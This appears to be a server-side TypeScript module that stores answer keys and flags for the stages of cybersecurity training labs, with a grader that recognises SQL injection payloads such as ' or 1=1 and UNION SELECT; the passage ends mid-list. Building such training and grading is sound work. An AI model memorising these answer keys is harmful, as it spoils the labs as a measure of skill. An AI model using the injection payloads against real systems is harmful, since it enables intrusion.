/**
 * Answer keys for lab task stages — server only.
 *
 * These used to live inside the `*-client.tsx` lab components, which meant every
 * flag and every correct multiple-choice option was compiled into the JavaScript
 * bundle and readable from devtools. The stage-completion endpoint then trusted
 * whatever the browser told it, so a learner could mark a lab solved without
 * answering anything.
 *
 * The key now lives here and never crosses the network. Client components send
 * the learner's raw answer to POST /api/labs/response, which calls
 * `checkStageAnswer` and only records a completion when it passes. The canonical
 * flag comes back in the response as `reveal` so the UI can echo it after a
 * correct submission rather than shipping it up front.
 *
 * NEVER import this module from a file marked "use client" — doing so puts the
 * whole answer key back in the bundle. `src/lib/labs/__tests__` guards that.
 */

/** One way of being right. Every field present in a clause must match. */
export type StageClause = {
  /** Flag equality, tolerant of leetspeak and the SAGE{...} wrapper. */
  flag?: string;
  /** Full-answer equality against any of these, ignoring case and whitespace. */
  exact?: string[];
  /** Every one of these substrings must appear. */
  includes?: string[];
  /** The answer must start with this. */
  prefix?: string;
  /** None of these substrings may appear. */
  notIncludes?: string[];
  /** Any of these regexes (case-insensitive) must match. */
  patterns?: string[];
  /** A named checker for stages whose rule is not expressible above. */
  custom?: "sqli-auth-bypass" | "sqli-union" | "sqli-blind";
};

export type StageAnswer = {
  /** Correct if ANY clause matches. Omitted when the stage is graded per field. */
  any?: StageClause[];
  /**
   * Per-field grading for stages that submit a JSON object rather than one
   * string — the investigation forms, where each finding is marked separately.
   */
  fields?: Record<string, StageClause[]>;
  /** Credit the stage only when every field passes. */
  requireAllFields?: boolean;
  /** Handed back to the client once the answer is correct, for display. */
  reveal?: string;
};

/** Collapse whitespace and case so formatting differences don't decide correctness. */
function normalise(s: string): string {
  return s.replace(/\s+/g, " ").trim().toLowerCase();
}

/** Whitespace removed entirely — for answers that are commands or queries. */
function squash(s: string): string {
  return s.replace(/\s+/g, "").toLowerCase();
}

/**
 * Normalised, with a SAGE{...} wrapper removed.
 *
 * Learners habitually wrap any short answer in the flag format because most
 * stages ask for one. The old in-browser checks stripped it, so this keeps the
 * same tolerance rather than failing answers that are right.
 */
function unwrap(s: string): string {
  return normalise(s).replace(/^sage\{/, "").replace(/\}$/, "");
}

/**
 * Flag comparison. Learners retype flags by hand, so the wrapper, case and the
 * usual leetspeak substitutions are all forgiven — the same tolerance the old
 * client-side `checkFlag` had.
 */
function stripFlag(s: string): string {
  const LEET: Record<string, string> = {
    "0": "o", "1": "i", "3": "e", "4": "a", "5": "s",
    "7": "t", "8": "b", "9": "g", "@": "a", "$": "s",
  };
  return s
    .trim()
    .replace(/^SAGE\{/i, "")
    .replace(/\}$/, "")
    .toLowerCase()
    .replace(/[01345789@$]/g, (c) => LEET[c] ?? c);
}

function customCheck(name: NonNullable<StageClause["custom"]>, answer: string): boolean {
  const n = normalise(answer);
  switch (name) {
    case "sqli-auth-bypass":
      return (
        /' *or *'?\d+'?='?\d+/.test(n) ||
        /' *or *true/.test(n) ||
        n.includes("' or 1=1") ||
        n.includes("'or'1'='1") ||
        (n.endsWith("--") && n.includes("'"))
      );
    case "sqli-union": {
      if (!n.includes("union") || !n.includes("select")) return false;
      // The injected SELECT has to return as many columns as the original.
      const selectPart = n.split("union")[1] ?? "";
      return selectPart.split(",").length >= 2;
    }
    case "sqli-blind": {
      // Credit needs both branches: one payload that resolves true and one false.
      const parts = n.split("|").map((p) => p.trim());
      const isBool = (p: string) =>
        (p.includes("' and ") || p.includes("' or ")) && p.includes("--");
      const isFalse = (p: string) =>
        p.includes("='0") || p.includes("= 0--") || p.includes("1=0");
      const bools = parts.filter(isBool);
      return bools.some(isFalse) && bools.some((p) => !isFalse(p));
    }
  }
}

function clauseMatches(clause: StageClause, answer: string): boolean {
  const n = normalise(answer);
  if (clause.flag !== undefined && stripFlag(answer) !== stripFlag(clause.flag)) return false;
  const u = unwrap(answer);
  if (clause.exact !== undefined) {
    const hit = clause.exact.some(
      (e) => normalise(e) === n || unwrap(e) === u || squash(e) === squash(answer),
    );
    if (!hit) return false;
  }
  if (clause.includes !== undefined && !clause.includes.every((t) => n.includes(normalise(t)))) return false;
  if (clause.prefix !== undefined && !(n.startsWith(normalise(clause.prefix)) || u.startsWith(unwrap(clause.prefix)))) return false;
  if (clause.notIncludes !== undefined && clause.notIncludes.some((t) => n.includes(normalise(t)))) return false;
  if (clause.patterns !== undefined && !clause.patterns.some((p) => new RegExp(p, "i").test(n))) return false;
  if (clause.custom !== undefined && !customCheck(clause.custom, answer)) return false;
  return true;
}

export const STAGE_ANSWERS: Record<string, Record<string, StageAnswer>> = {
  "abuseipdb-investigation": {
    "task_1": { any: [{ flag: "SAGE{98_p3rc3nt_342_r3p0rts}" }], reveal: "SAGE{98_p3rc3nt_342_r3p0rts}" },
    "task_2": { any: [{ exact: ["SSH Brute-Force"] }], reveal: "SAGE{ssh_brut3_f0rc3_c0rr0b0r4t3d}" },
    "task_3": { any: [{ exact: ["Block the IP at the firewall immediately and review bastion auth logs for any successful logins"] }], reveal: "SAGE{bl0ck_4nd_r3v13w_4uth_l0gs}" },
  },
  "active-directory-101": {
    "task_1": { any: [{ includes: ["svc_sqlserver", "svc_backup"], notIncludes: ["john.doe", "jane.smith"] }], reveal: "SAGE{d0m41n_3num3r4t10n_c0mpl3t3}" },
    "task_2": { any: [{ exact: ["Impacket GetUserSPNs"] }], reveal: "SAGE{k3rb3r04st1ng_svc_4cc0unt}" },
    "task_3": { any: [{ flag: "SAGE{p4ss_th3_h4sh_4dm1n}" }, { includes: ["psexec"] }], reveal: "SAGE{p4ss_th3_h4sh_4dm1n}" },
  },
  "advanced-sql-injection": {
    "task_1": { any: [{ exact: ["Boolean-based blind SQL injection is possible — the app's behavior itself leaks true/false conditions"] }], reveal: "SAGE{b00l3an_bl1nd_sql1_c0nf1rm3d}" },
    "task_2": { any: [{ flag: "SAGE{t1m3_b4s3d_bl1nd_3xtr4ct10n}" }], reveal: "SAGE{t1m3_b4s3d_bl1nd_3xtr4ct10n}" },
    "task_3": { any: [{ exact: ["It relies purely on measurable response delay, which exists regardless of what content the page shows"] }], reveal: "SAGE{d3l4y_1nd3p3nd3nt_0f_c0nt3nt}" },
  },
  "advanced-xss": {
    "task_1": { any: [{ flag: "SAGE{1mg_0n3rr0r_byp4ss3s_f1lt3r}" }], reveal: "SAGE{1mg_0n3rr0r_byp4ss3s_f1lt3r}" },
    "task_2": { any: [{ exact: ["XSS doesn't require the script tag at all — any element with an event handler attribute can execute JavaScript"] }], reveal: "SAGE{3v3nt_h4ndl3rs_n0_scr1pt_n33d3d}" },
    "task_3": { any: [{ exact: ["The malicious data (URL fragment) never gets sent to the server at all — it's processed entirely client-side"] }], reveal: "SAGE{cl13nt_s1d3_0nly_n3v3r_s3rv3r}" },
  },
  "ai-assisted-threat-hunting": {
    "task_1": { any: [{ flag: "SAGE{4nalyst_v3r1f13s_41_sh0rtl1st}" }], reveal: "SAGE{4nalyst_v3r1f13s_41_sh0rtl1st}" },
    "task_2": { any: [{ exact: ["As a force multiplier for triage and pattern-spotting, with a human analyst validating and making the final call"] }], reveal: "SAGE{4i_4ug3nts_hum4n_d0nt_r3pl4c3}" },
    "task_3": { any: [{ exact: ["Sensitive data may leave your security boundary and end up stored or processed by an external provider"] }], reveal: "SAGE{d4t4_l34v3s_p3r1m3t3r_thr1rd_p4rty}" },
  },
  "ai-data-leakage": {
    "task_1": { any: [{ flag: "SAGE{d14n3_wh1tf13ld_4cm3mfg_l34k}" }], reveal: "SAGE{d14n3_wh1tf13ld_4cm3mfg_l34k}" },
    "task_2": { any: [{ exact: ["The model memorized confidential data from its training/fine-tuning set and regurgitated it to an unauthorized user"] }], reveal: "SAGE{tr41n1ng_d4t4_m3m0r1z4t10n}" },
    "task_3": { any: [{ exact: ["Enforce the same data-access permissions on the AI's retrieval layer as on the original systems"] }], reveal: "SAGE{pr3s3rv3_4cc3ss_c0ntr0ls}" },
  },
  "ai-detection-evaluation": {
    "task_1": { any: [{ flag: "SAGE{4ccur4cy_m1sl34d1ng_1mb4l4nc3d_d4t4}" }], reveal: "SAGE{4ccur4cy_m1sl34d1ng_1mb4l4nc3d_d4t4}" },
    "task_2": { any: [{ exact: ["Precision and recall, since they account for the imbalance that accuracy alone hides"] }], reveal: "SAGE{prec1s10n_4nd_rec4ll_m4tt3r}" },
    "task_3": { any: [{ exact: ["Analyst alert fatigue, which causes real alerts to get missed or ignored over time"] }], reveal: "SAGE{4l3rt_f4t1gu3_fr0m_f4ls3_p0s1t1v3s}" },
  },
  "ai-hallucination-risks": {
    "task_1": { any: [{ flag: "SAGE{4i_h4llucin4t10n}" }], reveal: "SAGE{4i_h4llucin4t10n}" },
    "task_2": { any: [{ exact: ["Decisions based on it could waste critical incident response time chasing a vulnerability that doesn't exist"] }], reveal: "SAGE{w4st3d_1r_t1m3_0n_f4k3_cv3}" },
    "task_3": { any: [{ exact: ["Require human verification of any critical AI-generated claim against an authoritative source before acting on it"] }], reveal: "SAGE{v3r1fy_4g41nst_4uth0r1t4t1v3_s0urc3}" },
  },
  "ai-security-assessment": {
    "task_1": { any: [{ flag: "SAGE{p11_m3m0r1z3d_1n_f1n3tun3d_m0d3l}" }], reveal: "SAGE{p11_m3m0r1z3d_1n_f1n3tun3d_m0d3l}" },
    "task_2": { any: [{ exact: ["The model may regurgitate memorized PII from training data in its responses to any user"] }], reveal: "SAGE{m0d3l_c4n_l34k_tr41n1ng_p11}" },
    "task_3": { any: [{ exact: ["Add output filtering/DLP scanning on model responses to catch and redact leaked PII before it reaches the user"] }], reveal: "SAGE{0utput_dlp_f1lt3r1ng}" },
  },
  "ai-threat-modeling": {
    "task_1": { any: [{ flag: "SAGE{prompt_1nject10n_4bus1ng_funct10ns}" }], reveal: "SAGE{prompt_1nject10n_4bus1ng_funct10ns}" },
    "task_2": { any: [{ exact: ["Enforce strict server-side authorization checks on every function call, never trusting the model's decision alone"] }], reveal: "SAGE{s3rv3r_s1d3_4uth_0n_funct10n_c4ll}" },
    "task_3": { any: [{ exact: ["LLM behavior is probabilistic and can be manipulated via prompt injection, so you can't rely on the model's judgment as a security boundary"] }], reveal: "SAGE{m0d3l_judgm3nt_n0t_4_s3cur1ty_b0und4ry}" },
  },
  "alienvault-otx-pulse": {
    "task_1": { any: [{ flag: "SAGE{27_1nd1c4t0rs_qu13tp4nd4}" }], reveal: "SAGE{27_1nd1c4t0rs_qu13tp4nd4}" },
    "task_2": { any: [{ exact: ["Pulse A — verified author, high subscriber corroboration, and referenced vendor writeups"] }], reveal: "SAGE{v3r1f13d_h1gh_c0nf1d3nc3_puls3}" },
    "task_3": { any: [{ flag: "SAGE{wkstn_f1n_03_m4tch3d_pulse_10c}" }], reveal: "SAGE{wkstn_f1n_03_m4tch3d_pulse_10c}" },
  },
  "api-pentesting": {
    "task_1": { any: [{ flag: "SAGE{b0l4_br0k3n_0bj3ct_l3v3l_4uth}" }], reveal: "SAGE{b0l4_br0k3n_0bj3ct_l3v3l_4uth}" },
    "task_2": { any: [{ exact: ["Excessive Data Exposure — the API leaks more than the client needs, and any direct API caller sees it all"] }], reveal: "SAGE{3xc3ss1v3_d4t4_3xp0sur3}" },
    "task_3": { any: [{ exact: ["Enforce server-side ownership checks so a user can only fetch objects they actually own, regardless of the ID in the URL"] }], reveal: "SAGE{s3rv3r_s1d3_0wn3rsh1p_ch3ck}" },
  },
  "azure-logs-analysis": {
    "task_1": { any: [{ flag: "SAGE{1mp0ss1bl3_tr4v3l_d3t3ct3d}" }], reveal: "SAGE{1mp0ss1bl3_tr4v3l_d3t3ct3d}" },
    "task_2": { any: [{ exact: ["Immediately revoke the newly created admin role assignment and force session/token revocation for the account"] }], reveal: "SAGE{r3v0k3_4dm1n_r0l3_4nd_t0k3ns}" },
    "task_3": { any: [{ exact: ["Sign-in logs show who authenticated when; activity logs show what actions were taken — together they reconstruct the full attack chain"] }], reveal: "SAGE{c0mb1n3_s1gn1n_4nd_4ct1v1ty_l0gs}" },
  },
  "azure-rbac-misconfiguration": {
    "task_1": { any: [{ flag: "SAGE{gu3st_b0b_0wn3r_r00t_sc0p3}" }], reveal: "SAGE{gu3st_b0b_0wn3r_r00t_sc0p3}" },
    "task_2": { any: [{ exact: ["Owner can modify access control itself — the guest could grant further access to anyone"] }], reveal: "SAGE{0wn3r_c4n_r3gr4nt_4cc3ss}" },
    "task_3": { any: [{ exact: ["Remove the Owner assignment and replace it with a scoped custom role granting only what the partner needs"] }], reveal: "SAGE{sc0p3d_cust0m_r0l3_f1x}" },
  },
  "browser-forensics": {
    "task_1": { any: [{ flag: "SAGE{d0cs_sh4r3_c0rp_1nf0_typ0squ4t}" }], reveal: "SAGE{d0cs_sh4r3_c0rp_1nf0_typ0squ4t}" },
    "task_2": { any: [{ exact: ["A file disguised with a double extension (.html.exe) was downloaded and likely executed"] }], reveal: "SAGE{d0ubl3_3xt3ns10n_3x3c}" },
    "task_3": { any: [{ exact: ["Corporate credentials were entered into the phishing site and are now compromised — force a password reset immediately"] }], reveal: "SAGE{cr3d3nt14ls_c0mpr0m1s3d_r3s3t}" },
  },
  "build-pipeline-compromise": {
    "task_1": { any: [{ exact: ["post-build-optimise"] }, { exact: ["post build optimise"] }] },
    "task_2": { any: [{ exact: ["@corp/telemetry", "@corp/telemetry@9.9.9", "corp/telemetry@9.9.9"] }, { exact: ["corp/telemetry"] }] },
    "task_3": { any: [{ prefix: "b1e77c3f" }] },
  },
  "burp-suite-workflow": {
    "task_1": { any: [{ exact: ["Repeater"] }], reveal: "SAGE{r3p34t3r_f0r_m4nu4l_t4mp3r1ng}" },
    "task_2": { any: [{ flag: "SAGE{r0l3_p4r4m_pr1v_3sc4l4t10n}" }], reveal: "SAGE{r0l3_p4r4m_pr1v_3sc4l4t10n}" },
    "task_3": { any: [{ exact: ["Intruder"] }], reveal: "SAGE{1ntrud3r_f0r_p1n_bruteforce}" },
  },
  "business-email-compromise": {
    "task_1": { any: [{ flag: "SAGE{4ut0f0rw4rd_1nv01c3_rul3}" }], reveal: "SAGE{4ut0f0rw4rd_1nv01c3_rul3}" },
    "task_2": { any: [{ exact: ["Invoice/payment redirection fraud, where the attacker changes payment details mid-transaction using a trusted compromised account"] }], reveal: "SAGE{p4ym3nt_r3d1r3ct10n_fr4ud}" },
    "task_3": { any: [{ exact: ["Contact the bank/vendor immediately to attempt to halt or recall the wire transfer before it's fully processed"] }], reveal: "SAGE{4tt3mpt_w1r3_r3c4ll_1mm3d14t3ly}" },
  },
  "campaign-attribution": {
    "task_1": { any: [{ flag: "SAGE{m0d3r4t3_c0nf1d3nc3_4ttr1but10n}" }], reveal: "SAGE{m0d3r4t3_c0nf1d3nc3_4ttr1but10n}" },
    "task_2": { any: [{ exact: ["Malware can be shared, leaked, sold, or false-flagged, so even strong single indicators need corroboration from other evidence types"] }], reveal: "SAGE{c0rr0b0r4t3_4cr0ss_3v1d3nc3_typ3s}" },
    "task_3": { any: [{ exact: ["State the confidence level explicitly and show the supporting evidence, rather than presenting attribution as a certainty"] }], reveal: "SAGE{st4t3_c0nf1d3nc3_3xpl1c1tly}" },
  },
  "cloud-data-breach": {
    "task_1": { any: [{ flag: "SAGE{2_d4ys_t0_f1rst_3xt3rn4l_4cc3ss}" }], reveal: "SAGE{2_d4ys_t0_f1rst_3xt3rn4l_4cc3ss}" },
    "task_2": { any: [{ exact: ["There was no automated monitoring/alerting for public bucket exposure, leaving the misconfiguration undetected for over a month"] }], reveal: "SAGE{n0_4ut0m4t3d_3xp0sur3_m0n1t0r1ng}" },
    "task_3": { any: [{ exact: ["Breach notification to affected customers and relevant regulators, since unauthorized access to personal data was confirmed"] }], reveal: "SAGE{br34ch_n0t1f1c4t10n_r3qu1r3d}" },
  },
  "cloud-iam-misconfiguration": {
    "task_1": { any: [{ exact: ["\"Principal\": \"*\" grants access to literally anyone on the internet, not just your account"] }], reveal: "SAGE{publ1c_pr1nc1p4l_w1ldc4rd}" },
    "task_2": { any: [{ flag: "SAGE{48000_r3c0rds_p11_3xp0s3d}" }], reveal: "SAGE{48000_r3c0rds_p11_3xp0s3d}" },
    "task_3": { any: [{ exact: ["It grants unrestricted access to every AWS action on every resource — full account takeover if the key leaks"] }], reveal: "SAGE{4dm1n_st4r_st4r_1am_p0l1cy}" },
  },
  "cloud-incident-response": {
    "task_1": { any: [{ flag: "SAGE{r3v0k3_cr3d3nt14ls_1mm3d14t3ly}" }], reveal: "SAGE{r3v0k3_cr3d3nt14ls_1mm3d14t3ly}" },
    "task_2": { any: [{ exact: ["That would destroy volatile evidence and logs needed to understand scope and root cause"] }], reveal: "SAGE{pr3s3rv3_3v1d3nc3_b3f0r3_t34rd0wn}" },
    "task_3": { any: [{ exact: ["Reviewing CloudTrail/audit logs for every action the compromised credentials performed across all services, not just the one bucket"] }], reveal: "SAGE{4ud1t_4ll_4ct10ns_n0t_just_0n3_s3rv1c3}" },
  },
  "cloudtrail-analysis": {
    "task_1": { any: [{ flag: "SAGE{b4ckup_svc2_4dm1n_b4ckd00r}" }], reveal: "SAGE{b4ckup_svc2_4dm1n_b4ckd00r}" },
    "task_2": { any: [{ exact: ["The source IP is outside the known-good office VPN range entirely"] }], reveal: "SAGE{s0urc3_1p_4n0m4ly}" },
    "task_3": { any: [{ exact: ["Delete the rogue user, revoke/rotate the compromised access key, and review CloudTrail for further abuse"] }], reveal: "SAGE{r3v0k3_4nd_d3l3t3_b4ckd00r}" },
  },
  "container-escape-theory": {
    "task_1": { any: [{ flag: "SAGE{sh4r3d_h0st_k3rn3l}" }], reveal: "SAGE{sh4r3d_h0st_k3rn3l}" },
    "task_2": { any: [{ exact: ["A vulnerability in the shared kernel or container runtime that lets a process break out of its namespace/cgroup isolation"] }], reveal: "SAGE{3xpl01t_k3rn3l_0r_runt1m3_bug}" },
    "task_3": { any: [{ exact: ["A separate VM (or gVisor/Kata-style sandboxed runtime) rather than a standard container, since containers share the kernel attack surface"] }], reveal: "SAGE{vm_b0und4ry_f0r_untrust3d_w0rkl04ds}" },
  },
  "credential-stuffing-attack": {
    "task_1": { any: [{ flag: "SAGE{cr3d3nt14l_stuff1ng}" }], reveal: "SAGE{cr3d3nt14l_stuff1ng}" },
    "task_2": { any: [{ exact: ["It targets many different accounts with pre-obtained, likely-valid credential pairs, rather than guessing passwords for one account repeatedly"] }], reveal: "SAGE{m4ny_4cc0unts_kn0wn_cr3ds}" },
    "task_3": { any: [{ exact: ["Enforce multi-factor authentication, since it defeats stolen-but-correct password/username pairs"] }], reveal: "SAGE{mfa_d3f34ts_stuff1ng}" },
  },
  "dcsync-attack": {
    "task_1": { any: [{ flag: "SAGE{r3pl1c4t1ng_d1r3ct0ry_ch4ng3s_4ll}" }], reveal: "SAGE{r3pl1c4t1ng_d1r3ct0ry_ch4ng3s_4ll}" },
    "task_2": { any: [{ exact: ["It rides the legitimate domain replication protocol, so it looks like normal DC-to-DC traffic rather than an obvious file access"] }], reveal: "SAGE{l00ks_l1k3_l3g1t_r3pl1c4t10n}" },
    "task_3": { any: [{ exact: ["Remove the replication permission from the non-DC account and audit for any other accounts with the same unnecessary grant"] }], reveal: "SAGE{r3v0k3_r3pl_perm_4ud1t_0th3rs}" },
  },
  "ddos-attack-incident": {
    "task_1": { any: [{ flag: "SAGE{50x_b4s3l1n3_thous4nds_0f_1ps}" }], reveal: "SAGE{50x_b4s3l1n3_thous4nds_0f_1ps}" },
    "task_2": { any: [{ exact: ["Route traffic through a DDoS scrubbing/mitigation service or CDN that can absorb and filter the volume before it reaches your origin"] }], reveal: "SAGE{scrubb1ng_s3rv1c3_4bs0rbs_v0lum3}" },
    "task_3": { any: [{ exact: ["A DDoS can also be cover for a credential stuffing attempt hidden inside the traffic flood, so endpoint-level limits still matter"] }], reveal: "SAGE{d0s_c4n_h1d3_cr3d_stuff1ng}" },
  },
  "detect-ai-generated-phishing": {
    "task_1": { any: [{ flag: "SAGE{n0_gr4mm4r_4w4rd_ph1sh1ng}" }], reveal: "SAGE{n0_gr4mm4r_4w4rd_ph1sh1ng}" },
    "task_2": { any: [{ exact: ["Behavioral and metadata signals — sender domain mismatch, urgency + payment request combo, unusual send time — rather than writing quality"] }], reveal: "SAGE{f0cus_0n_m3t4d4t4_n0t_wr1t1ng}" },
    "task_3": { any: [{ exact: ["Out-of-band verification of any payment/wire request through a separate, known-good channel"] }], reveal: "SAGE{0ut_0f_b4nd_v3r1f1c4t10n}" },
  },
  "detection-logic-building": {
    "task_1": { any: [{ flag: "SAGE{h1gh_v0lum3_4nd_un1qu3_us3rs}" }], reveal: "SAGE{h1gh_v0lum3_4nd_un1qu3_us3rs}" },
    "task_2": { any: [{ exact: ["AND — both conditions together, or you'll drown in false positives from either alone"] }], reveal: "SAGE{4nd_l0g1c_n0t_0r}" },
    "task_3": { any: [{ exact: ["Baseline normal login volume/diversity per IP over time, then alert only on statistically significant deviations"] }], reveal: "SAGE{b4s3l1n3_dr1v3n_thr3sh0ld}" },
  },
  "detection-tuning": {
    "task_1": { any: [{ flag: "SAGE{8_p3rc3nt_tru3_p0s1t1v3}" }], reveal: "SAGE{8_p3rc3nt_tru3_p0s1t1v3}" },
    "task_2": { any: [{ exact: ["Password reset events cause old cached credentials to auto-retry, matching the same pattern"] }], reveal: "SAGE{p4ssw0rd_r3s3t_n0is3}" },
    "task_3": { any: [{ exact: ["Suppress alerts within N minutes of a known password-reset event for that account"] }], reveal: "SAGE{c0nt3xt_4w4r3_suppr3ss10n}" },
  },
  "detection-validation": {
    "task_1": { any: [{ flag: "SAGE{98_p3rc3nt_f4ls3_p0s1t1v3_r4t3}" }], reveal: "SAGE{98_p3rc3nt_f4ls3_p0s1t1v3_r4t3}" },
    "task_2": { any: [{ exact: ["No — a 98% false-positive rate means auto-blocking would constantly disrupt legitimate admin work"] }], reveal: "SAGE{n0t_r34dy_f0r_4ut0_bl0ck}" },
    "task_3": { any: [{ exact: ["Add exclusions for known-legitimate encoded PowerShell sources (e.g. signed admin scripts) and re-baseline"] }], reveal: "SAGE{3xclud3_kn0wn_g00d_r3b4s3l1n3}" },
  },
  "dfir-timeline-creation": {
    "task_1": { any: [{ exact: ["The RDP logon at 14:02:11 — everything else happens after it"] }], reveal: "SAGE{rdp_l0g0n_14_02_f1rst_3v3nt}" },
    "task_2": { any: [{ exact: ["The attacker logged in via RDP, then dropped and executed a credential-dumping tool"] }], reveal: "SAGE{rdp_dr0p_3x3c_s3qu3nc3}" },
    "task_3": { any: [{ exact: ["The attacker timestomped the file to backdate $STANDARD_INFORMATION and blend in with old files"] }], reveal: "SAGE{t1m3st0mp1ng_d3t3ct3d}" },
  },
  "dns-exfiltration-detection": {
    "task_1": { any: [{ exact: ["DNS tunneling / exfiltration"] }], reveal: "SAGE{dns_tunn3l_sp0tt3d}" },
    "task_2": { any: [{ includes: ["join this secure sql data"] }] },
    "task_3": { any: [{ flag: "SAGE{dns_3xfil_txt_tunn3l}" }], reveal: "SAGE{dns_3xfil_txt_tunn3l}" },
  },
  "docker-security": {
    "task_1": { any: [{ flag: "SAGE{r00t_us3r_4nd_unp1nn3d_t4g}" }], reveal: "SAGE{r00t_us3r_4nd_unp1nn3d_t4g}" },
    "task_2": { any: [{ exact: ["If an attacker breaks out of the container or exploits a kernel vulnerability, root inside the container often means root on the host too"] }], reveal: "SAGE{r00t_1ns1d3_c4n_m34n_r00t_0uts1d3}" },
    "task_3": { any: [{ exact: ["A mutable tag can silently change to a different (possibly compromised) image between builds, breaking reproducibility and supply-chain trust"] }], reveal: "SAGE{p1n_d1g3st_f0r_supply_ch41n}" },
  },
  "email-header-forensics": {
    "task_1": { any: [{ exact: ["198.51.100.203"] }] },
    "task_2": { any: [{ exact: ["northwind-finance.co", ".northwind-finance.co"] }, { exact: [".co"] }, { exact: ["co"] }] },
    "task_3": { any: [{ exact: ["reply-to"] }, { exact: ["replyto"] }, { exact: ["reply to"] }] },
  },
  "event-correlation": {
    "task_1": { any: [{ flag: "SAGE{l0g0n1d_0x3e7a21_c0rr3l4t10n}" }], reveal: "SAGE{l0g0n1d_0x3e7a21_c0rr3l4t10n}" },
    "task_2": { any: [{ exact: ["The attacker logged onto Host A, pivoted over SMB to Host B, then escalated to special/admin privileges on Host C — all under one session"] }], reveal: "SAGE{s1ngl3_s3ss10n_multi_h0st_p1v0t}" },
    "task_3": { any: [{ exact: ["Kill/disable that specific Logon ID's session and force credential rotation for svc_deploy everywhere it has access"] }], reveal: "SAGE{k1ll_s3ss10n_r0t4t3_cr3ds}" },
  },
  "file-upload-bypass": {
    "task_1": { any: [{ exact: ["It's an incomplete deny-list — it doesn't cover every executable PHP extension"] }], reveal: "SAGE{1nc0mpl3t3_d3ny_l1st}" },
    "task_2": { any: [{ flag: "SAGE{pht_extension_bypass}" }], reveal: "SAGE{pht_extension_bypass}" },
    "task_3": { any: [{ exact: ["Use an allow-list of safe extensions, validate content-type, and store uploads outside the web root"] }], reveal: "SAGE{4ll0w_l1st_4nd_1s0l4t3}" },
  },
  "gcp-iam-permissions": {
    "task_1": { any: [{ flag: "SAGE{4ll4uth3nt1c4t3dus3rs_v13w3r_3xp0sur3}" }], reveal: "SAGE{4ll4uth3nt1c4t3dus3rs_v13w3r_3xp0sur3}" },
    "task_2": { any: [{ exact: ["Editor grants near-project-wide write access, far beyond what CI deploy actually touches"] }], reveal: "SAGE{3d1t0r_t00_br04d_f0r_c1_d3pl0y}" },
    "task_3": { any: [{ exact: ["Replace roles/editor with a custom role scoped to only Cloud Run deploy and Artifact Registry push"] }], reveal: "SAGE{cust0m_r0l3_c1_sc0p3d}" },
  },
  "golden-ticket-attack": {
    "task_1": { any: [{ flag: "SAGE{krbtgt_4cc0unt_h4sh_st0l3n}" }], reveal: "SAGE{krbtgt_4cc0unt_h4sh_st0l3n}" },
    "task_2": { any: [{ exact: ["The forged ticket is signed with the KRBTGT hash itself, not tied to any individual user's password"] }], reveal: "SAGE{s1gn3d_by_krbtgt_n0t_us3r_pw}" },
    "task_3": { any: [{ exact: ["Reset the KRBTGT password twice (to flush both current and previous hash versions), not just individual user passwords"] }], reveal: "SAGE{r3s3t_krbtgt_tw1c3}" },
  },
  "hydra-advanced": {
    "task_1": { any: [{ exact: ["Build a small targeted wordlist matching the known pattern (e.g. Summer2026!) instead of a huge generic list that will trigger lockouts"] }], reveal: "SAGE{t4rg3t3d_w0rdl1st_4v01ds_l0ck0ut}" },
    "task_2": { any: [{ flag: "SAGE{jsm1th_summ3r2026_val1d}" }], reveal: "SAGE{jsm1th_summ3r2026_val1d}" },
    "task_3": { any: [{ exact: ["Don't keep spraying the same account with more attempts once you have a hit — pivot to using the credential for authorized next steps"] }], reveal: "SAGE{st0p_spr4y1ng_4ft3r_h1t}" },
  },
  "idor-hunting": {
    "task_1": { any: [{ flag: "SAGE{pr1y4_18400_1nv0ic3_l34k}" }], reveal: "SAGE{pr1y4_18400_1nv0ic3_l34k}" },
    "task_2": { any: [{ exact: ["The endpoint never verifies the await db.invoice.findUnique({ where: { id: req.params.id } }) belongs to the requesting user"] }], reveal: "SAGE{m1ss1ng_0wn3rsh1p_ch3ck}" },
    "task_3": { any: [{ exact: ["Mass assignment / broken function-level authorization — a user can escalate their own role"] }], reveal: "SAGE{s3lf_pr0m0t3_4dm1n_r0l3}" },
  },
  "incident-severity-classification": {
    "task_1": { any: [{ flag: "SAGE{4l3rt_2_d0m41n_4dm1n_cr1t1c4l}" }], reveal: "SAGE{4l3rt_2_d0m41n_4dm1n_cr1t1c4l}" },
    "task_2": { any: [{ exact: ["Privileged account, plus anomalous access pattern, plus high-impact action together push it to critical"] }], reveal: "SAGE{pr1v_4cc3ss_4n0m4ly_1mp4ct}" },
    "task_3": { any: [{ exact: ["Both are low severity — routine monitoring is sufficient, and they shouldn't compete with the critical alert for response time"] }], reveal: "SAGE{l0w_s3v_r0ut1n3_m0n1t0r1ng}" },
  },
  "insider-data-theft": {
    "task_1": { any: [{ flag: "SAGE{15gb_p3rs0n4l_dr1v3_upl04d}" }], reveal: "SAGE{15gb_p3rs0n4l_dr1v3_upl04d}" },
    "task_2": { any: [{ exact: ["The employee likely staged the data by first locating and gathering files they didn't normally need, ahead of the exfiltration"] }], reveal: "SAGE{st4g1ng_4cc3ss_b3f0r3_3xf1l}" },
    "task_3": { any: [{ exact: ["Immediately restrict/revoke access to sensitive systems and preserve their account and device for forensic imaging"] }], reveal: "SAGE{r3v0k3_4cc3ss_pr3s3rv3_f0r3ns1cs}" },
  },
  "insider-threat-investigation": {
    "task_1": { any: [{ exact: ["Departing employee, off-hours access, mass file access"] }], reveal: "SAGE{d3p4rt1ng_3mpl0y33_r1sk}" },
    "task_2": { any: [{ flag: "SAGE{sn2291x_3_1gb_usb_exfil}" }], reveal: "SAGE{sn2291x_3_1gb_usb_exfil}" },
    "task_3": { any: [{ exact: ["Disable access immediately, preserve the USB/DLP evidence, and involve HR/Legal"] }], reveal: "SAGE{c0nt41n_4nd_3sc4l4t3}" },
  },
  "ioc-correlation": {
    "task_1": { any: [{ flag: "SAGE{s1ngl3_c4mp41gn_sh4r3d_c2}" }], reveal: "SAGE{s1ngl3_c4mp41gn_sh4r3d_c2}" },
    "task_2": { any: [{ exact: ["Correlate the alerts by shared indicator (C2 domain/subnet) rather than just internal alert grouping — the same infrastructure ties them together"] }], reveal: "SAGE{c0rr3l4t3_by_sh4r3d_10c_n0t_src}" },
    "task_3": { any: [{ exact: ["Pivot on the confirmed IOCs (C2 domain, subnet) to search for any other affected hosts across the environment"] }], reveal: "SAGE{p1v0t_0n_c0nf1rm3d_10cs}" },
  },
  "ioc-feed-integration": {
    "task_1": { any: [{ flag: "SAGE{h1gh_c0nf1d3nc3_r3c3nt_4g3_w1ns}" }], reveal: "SAGE{h1gh_c0nf1d3nc3_r3c3nt_4g3_w1ns}" },
